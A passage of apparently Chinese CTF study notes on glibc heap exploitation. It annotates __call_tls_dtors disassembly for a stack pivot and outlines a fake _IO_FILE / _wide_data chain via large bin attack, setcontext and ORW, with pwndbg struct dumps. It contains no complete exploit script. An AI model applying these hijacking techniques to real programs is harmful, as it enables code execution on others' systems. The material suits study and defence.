class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; x /40xi __GI___call_tls_dtors<br>   0x7f3db2f85550 &lt;__GI___call_tls_dtors&gt;:endbr64 <br>   0x7f3db2f85554 &lt;__GI___call_tls_dtors+4&gt;:push   rbp<br>   0x7f3db2f85555 &lt;__GI___call_tls_dtors+5&gt;:push   rbx<br>   0x7f3db2f85556 &lt;__GI___call_tls_dtors+6&gt;:sub    rsp,0x8<br>   0x7f3db2f8555a &lt;__GI___call_tls_dtors+10&gt;:mov    rbx,QWORD PTR [rip+0x1ad82f]        # 0x7f3db3132d90<br>   0x7f3db2f85561 &lt;__GI___call_tls_dtors+17&gt;:mov    rbp,QWORD PTR fs:[rbx]<br>   0x7f3db2f85565 &lt;__GI___call_tls_dtors+21&gt;:test   rbp,rbp<br>   0x7f3db2f85568 &lt;__GI___call_tls_dtors+24&gt;:je     0x7f3db2f855ad &lt;__GI___call_tls_dtors+93&gt;<br>   <br>   0x7f3db2f8556a &lt;__GI___call_tls_dtors+26&gt;:nop    WORD PTR [rax+rax*1+0x0]<br>   0x7f3db2f85570 &lt;__GI___call_tls_dtors+32&gt;:mov    rdx,QWORD PTR [rbp+0x18]<br>   0x7f3db2f85574 &lt;__GI___call_tls_dtors+36&gt;:mov    rax,QWORD PTR [rbp+0x0]<br>   0x7f3db2f85578 &lt;__GI___call_tls_dtors+40&gt;:ror    rax,0x11<br>   0x7f3db2f8557c &lt;__GI___call_tls_dtors+44&gt;:xor    rax,QWORD PTR fs:0x30<br>   0x7f3db2f85585 &lt;__GI___call_tls_dtors+53&gt;:mov    QWORD PTR fs:[rbx],rdx<br>   0x7f3db2f85589 &lt;__GI___call_tls_dtors+57&gt;:mov    rdi,QWORD PTR [rbp+0x8]<br>   0x7f3db2f8558d &lt;__GI___call_tls_dtors+61&gt;:call   rax<br>   <br>   0x7f3db2f8558f &lt;__GI___call_tls_dtors+63&gt;:mov    rax,QWORD PTR [rbp+0x10]<br>   0x7f3db2f85593 &lt;__GI___call_tls_dtors+67&gt;:lock sub QWORD PTR [rax+0x468],0x1<br>   0x7f3db2f8559c &lt;__GI___call_tls_dtors+76&gt;:mov    rdi,rbp<br>   0x7f3db2f8559f &lt;__GI___call_tls_dtors+79&gt;:call   0x7f3db2f6d370 &lt;free@plt&gt;<br>   0x7f3db2f855a4 &lt;__GI___call_tls_dtors+84&gt;:mov    rbp,QWORD PTR fs:[rbx]<br>   0x7f3db2f855a8 &lt;__GI___call_tls_dtors+88&gt;:test   rbp,rbp<br>   0x7f3db2f855ab &lt;__GI___call_tls_dtors+91&gt;:jne    0x7f3db2f85570 &lt;__GI___call_tls_dtors+32&gt;<br>   0x7f3db2f855ad &lt;__GI___call_tls_dtors+93&gt;:add    rsp,0x8<br>   0x7f3db2f855b1 &lt;__GI___call_tls_dtors+97&gt;:pop    rbx<br>   0x7f3db2f855b2 &lt;__GI___call_tls_dtors+98&gt;:pop    rbp<br>   0x7f3db2f855b3 &lt;__GI___call_tls_dtors+99&gt;:ret<br>   <br>   <br>   nop WORD PTR [rax+rax*1+0x0] #滑块<br>   mov rdx,QWORD PTR [rbp+0x18] #rbp是第一个结构体的位置addr，那么将[addr+0x18]的值赋给rdx,这个值是结构体里的next指针。<br>   mov rax,QWORD PTR [rbp+0x0]  #将结构体的fuc指针交给rax <br>   ror rax,0x11 #fuc与0x11进行右循环异或，结果保存在rax <br>   xor rax,QWORD PTR fs:0x30 #rax 与fs段里的某一个值进行异或，这个值就是tcache的key字段， <br>   #或者说就是secret的变量的值，secret的位置在tls基址+0x30 <br>   mov QWORD PTR fs:[rbx],rdx   #将next指针放入fs段 <br>   mov rdi,QWORD PTR [rbp+0x8]  #将obj指针写入rdi <br>   call rax #调用fuc<br></code></pre></td></tr></table></figure><p>不会对tls_dtor_list的结构做是否合法的检查。而且这里还设置了rbp栈底指向结构体的地址，</p><p>如果我们将rbp劫持到某一个地址，然后call rax的时候执行leave ret</p><p>就可以实现栈的迁移</p><h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><p>把<code>tls_dtor_list</code>的<strong>头节点</strong>写为一个堆地址heap_address_ctr，然后在heap_address_ctr写入leave ret的gadget指针，这样，call rax 后，rip 指向了heap_address_ctr +8，我们就完成了栈的劫持，我们可以在这里布置rop。</p><h3 id="exit-IO流"><a href="#exit-IO流" class="headerlink" title="exit_IO流"></a>exit_IO流</h3><p><strong>调试的时候看</strong></p><ul><li>exit<ul><li>__run_exit_handlers<ul><li>fcloseall<ul><li>_IO_cleanup<ul><li>_IO_flush_all_lockp<ul><li>_IO_OVERFLOW(fp) (指调用vtable里固定偏移的一个函数，我们可以在此对vtable进行错位)<ul><li>_IO_new_file_overflow（即vtable里固定偏移的一个函数）</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h3><p><a href="https://www.cnblogs.com/7resp4ss/p/16891099.html">https://www.cnblogs.com/7resp4ss/p/16891099.html</a></p><p><strong>链子</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">_IO_wfile_overflow</span><br><span class="hljs-string">    _IO_wdoallocbuf</span><br><span class="hljs-string">        _IO_WDOALLOCATE</span><br><span class="hljs-string">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="hljs-string">                magic_gadget</span><br><span class="hljs-string">                    setcontext+61</span><br><span class="hljs-string">                        orw</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">large bin attack -&gt; _IO_list_all_chain = chunkA </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkAfake_IO_FILE_plus:</span><br><span class="hljs-string">flag = ~(2 | 0x8 | 0x800)</span><br><span class="hljs-string">vtable = _IO_wfile_jumps</span><br><span class="hljs-string">_wide_data = chunkB  (fake_wide_data)</span><br><span class="hljs-string">_IO_write_end -&gt; Magic_gadget</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkB-----&gt;_wide_data:</span><br><span class="hljs-string">_IO_write_base = 0</span><br><span class="hljs-string">_IO_buf_base = 0</span><br><span class="hljs-string">_wide_vtable = chunkC (doallocate_addr)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkC-----&gt;  _wide_data-&gt;_wide_vtable:</span><br><span class="hljs-string">doallocate = chunkD (setcontext+orw)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkD----&gt;setcontext + orw</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="IO-list-all链子"><a href="#IO-list-all链子" class="headerlink" title="_IO_list_all链子"></a><strong>_IO_list_all链子</strong></h4><p><code>_IO_list_all+0x88 为_chain ，large bin attack改其为下一个chunk地址</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p *_IO_list_all<br>$<span class="hljs-number">5</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">-72540025</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_read_end = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_read_base = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_write_base = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_write_end = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7efd6cadb723</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7efd6cadb724</span> &lt;_IO_2_1_stderr_+<span class="hljs-number">132</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7efd6cadb780</span> &lt;_IO_2_1_stdout_&gt;, <span class="hljs-comment">//改为chunkA:fake_IO_FILE_plus</span><br>    _fileno = <span class="hljs-number">2</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">-1</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x7efd6cadd740</span> &lt;_IO_stdfile_2_lock&gt;,<br>    _offset = <span class="hljs-number">-1</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7efd6cada8a0</span> &lt;_IO_wide_data_2&gt;,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = <span class="hljs-number">0</span>,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7efd6cadc580</span> &lt;__GI__IO_file_jumps&gt;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a><strong>_IO_FILE_plus结构体</strong></h4><p>（在库里面没找到，直接调pwndbg看的）</p><p><strong>chunkA &#x3D; fake_IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p  *(<span class="hljs-keyword">struct</span> _IO_FILE_plus *) <span class="hljs-built_in">stdout</span><br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">-72537977</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_read_end = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_read_base = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_write_base = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_write_end = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7f645cbaa803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7f645cbaa804</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">132</span>&gt; <span class="hljs-string">&quot;&quot;</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x7f645cba9aa0</span> &lt;_IO_2_1_stdin_&gt;,<br>    _fileno = <span class="hljs-number">1</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">-1</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&gt;&quot;</span>,<br>    _lock = <span class="hljs-number">0x7f645cbac750</span> &lt;_IO_stdfile_1_lock&gt;,<br>    _offset = <span class="hljs-number">-1</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7f645cba99a0</span> &lt;_IO_wide_data_1&gt;,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = <span class="hljs-number">-1</span>,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7f645cbab580</span> &lt;__GI__IO_file_jumps&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>_IO_FILE_plus -&gt;  _wide_data  =  chunkB_addr</code></p><p> 根据程序的堆块条件，自己控制偏移</p><p><strong>板子</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h4 id="IO-wide-data结构体"><a href="#IO-wide-data结构体" class="headerlink" title="_IO_wide_data结构体"></a><strong>_IO_wide_data结构体</strong></h4><p><strong>chunkB &#x3D; fake_IO_wide_data</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p  *(<span class="hljs-keyword">struct</span> _IO_wide_data *) <span class="hljs-built_in">stdout</span><br>$<span class="hljs-number">1</span> = &#123;<br>  _IO_read_ptr = <span class="hljs-number">0xfbad2887</span> &lt;error: Cannot access memory at address <span class="hljs-number">0xfbad2887</span>&gt;,<br>  _IO_read_end = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_read_base = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_write_base = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_write_ptr = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_write_end = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_buf_base = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_buf_end = <span class="hljs-number">0x7f601987f803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt; <span class="hljs-string">L&quot;&gt;\x88175000\x7f6019\xffffff00\xffffffffÿ&quot;</span>,<br>  _IO_save_base = <span class="hljs-number">0x7f601987f804</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">132</span>&gt; <span class="hljs-string">L&quot;&quot;</span>,<br>  _IO_backup_base = <span class="hljs-number">0x0</span>,<br>  _IO_save_end = <span class="hljs-number">0x0</span>,<br>  _IO_state = &#123;<br>    __count = <span class="hljs-number">0</span>,<br>    __value = &#123;<br>      __wch = <span class="hljs-number">0</span>,<br>      __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>    &#125;<br>  &#125;,<br>  _IO_last_state = &#123;<br>    __count = <span class="hljs-number">0</span>,<br>    __value = &#123;<br>      __wch = <span class="hljs-number">0</span>,<br>      __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>    &#125;<br>  &#125;,<br>  _codecvt = &#123;<br>    __cd_in = &#123;<br>      step = <span class="hljs-number">0x7f601987eaa0</span> &lt;_IO_2_1_stdin_&gt;,<br>      step_data = &#123;<br>        __outbuf = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>        __outbufend = <span class="hljs-number">0xffffffffffffffff</span> &lt;error: Cannot access memory at address <span class="hljs-number">0xffffffffffffffff</span>&gt;,<br>        __flags = <span class="hljs-number">1040187392</span>,<br>        __invocation_counter = <span class="hljs-number">0</span>,<br>        __internal_use = <span class="hljs-number">428349264</span>,<br>        __statep = <span class="hljs-number">0xffffffffffffffff</span>,<br>        __state = &#123;<br>          __count = <span class="hljs-number">0</span>,<br>          __value = &#123;<br>            __wch = <span class="hljs-number">0</span>,<br>            __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    __cd_out = &#123;<br>      step = <span class="hljs-number">0x7f601987e9a0</span> &lt;_IO_wide_data_1&gt;,<br>      step_data = &#123;<br>        __outbuf = <span class="hljs-number">0x0</span>,<br>        __outbufend = <span class="hljs-number">0x0</span>,<br>        __flags = <span class="hljs-number">0</span>,<br>        __invocation_counter = <span class="hljs-number">0</span>,<br>        __internal_use = <span class="hljs-number">-1</span>,<br>        __statep = <span class="hljs-number">0x0</span>,<br>        __state = &#123;<br>          __count = <span class="hljs-number">0</span>,<br>          __value = &#123;<br>            __wch = <span class="hljs-number">0</span>,<br>            __wchb = <span class="hljs-string">&quot;\000\000\000&quot;</span><br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>  _shortbuf = <span class="hljs-string">L&quot;\x19880580&quot;</span>,<br>  _wide_vtable = <span class="hljs-number">0x7f601987f6a0</span> &lt;_IO_2_1_stderr_&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>_IO_wide_data -&gt; _wide_vtable  = chunkC</code></p><h4 id="IO-wife-jumps"><a href="#IO-wife-jumps" class="headerlink" title="_IO_wife_jumps"></a>_IO_wife_jumps</h4><p>直接引用，放在fake_IO_FILE_plus里面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_wfile_jumps<br>$<span class="hljs-number">2</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x7fb140872ba0</span> &lt;_IO_new_file_finish&gt;, <br>  __overflow = <span class="hljs-number">0x7fb14086db00</span> &lt;__GI__IO_wfile_overflow&gt;, <br>  __underflow = <span class="hljs-number">0x7fb14086c770</span> &lt;__GI__IO_wfile_underflow&gt;,<br>  __uflow = <span class="hljs-number">0x7fb14086b4c0</span> &lt;__GI__IO_wdefault_uflow&gt;,<br>  __pbackfail = <span class="hljs-number">0x7fb14086b270</span> &lt;__GI__IO_wdefault_pbackfail&gt;,<br>  __xsputn = <span class="hljs-number">0x7fb14086df60</span> &lt;__GI__IO_wfile_xsputn&gt;,<br>  __xsgetn = <span class="hljs-number">0x7fb140872350</span> &lt;__GI__IO_file_xsgetn&gt;, <br>  __seekoff = <span class="hljs-number">0x7fb14086cee0</span> &lt;__GI__IO_wfile_seekoff&gt;,<br>  __seekpos = <span class="hljs-number">0x7fb1408746e0</span> &lt;_IO_default_seekpos&gt;,<br>  __setbuf = <span class="hljs-number">0x7fb1408714b0</span> &lt;_IO_new_file_setbuf&gt;,<br>  __sync = <span class="hljs-number">0x7fb14086ddc0</span> &lt;__GI__IO_wfile_sync&gt;,<br>  __doallocate = <span class="hljs-number">0x7fb140867f00</span> &lt;_IO_wfile_doallocate&gt;, <br>  __read = <span class="hljs-number">0x7fb140872760</span> &lt;__GI__IO_file_read&gt;,<br>  __write = <span class="hljs-number">0x7fb1408721a0</span> &lt;_IO_new_file_write&gt;,<br>  __seek = <span class="hljs-number">0x7fb140871930</span> &lt;__GI__IO_file_seek&gt;,<br>  __close = <span class="hljs-number">0x7fb1408714a0</span> &lt;__GI__IO_file_close&gt;,<br>  __stat = <span class="hljs-number">0x7fb140872190</span> &lt;__GI__IO_file_stat&gt;,<br>  __showmanyc = <span class="hljs-number">0x7fb1408755b0</span> &lt;_IO_default_showmanyc&gt;,<br>  __imbue = <span class="hljs-number">0x7fb1408755c0</span> &lt;_IO_default_imbue&gt;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="wide-vtable"><a href="#wide-vtable" class="headerlink" title="_wide_vtable"></a>_wide_vtable</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>      <span class="hljs-type">wchar_t</span> *_IO_read_ptr;   <br>      <span class="hljs-type">wchar_t</span> *_IO_read_end;<br>      <span class="hljs-type">wchar_t</span> *_IO_read_base;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_base;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_ptr;<br>      <span class="hljs-type">wchar_t</span> *_IO_write_end;   <br>      <span class="hljs-type">wchar_t</span> *_IO_buf_base;   <br>      <span class="hljs-type">wchar_t</span> *_IO_buf_end;   <br>      [...]<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>虚表就是 _IO_jump_t 结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p (*(<span class="hljs-keyword">struct</span> _IO_jump_t*) <span class="hljs-built_in">stdout</span>)<br>$<span class="hljs-number">6</span> = &#123;<br>  __dummy = <span class="hljs-number">4222429319</span>,<br>  __dummy2 = <span class="hljs-number">139892850513923</span>,<br>  __finish = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __overflow = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __underflow = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __uflow = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __pbackfail = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __xsputn = <span class="hljs-number">0x7f3b57a95803</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">131</span>&gt;,<br>  __xsgetn = <span class="hljs-number">0x7f3b57a95804</span> &lt;_IO_2_1_stdout_+<span class="hljs-number">132</span>&gt;,<br>  __seekoff = <span class="hljs-number">0x0</span>,<br>  __seekpos = <span class="hljs-number">0x0</span>,<br>  __setbuf = <span class="hljs-number">0x0</span>,<br>  __sync = <span class="hljs-number">0x0</span>,<br>  __doallocate = <span class="hljs-number">0x7f3b57a94aa0</span> &lt;_IO_2_1_stdin_&gt;,<br>  __read = <span class="hljs-number">0x1</span>,<br>  __write = <span 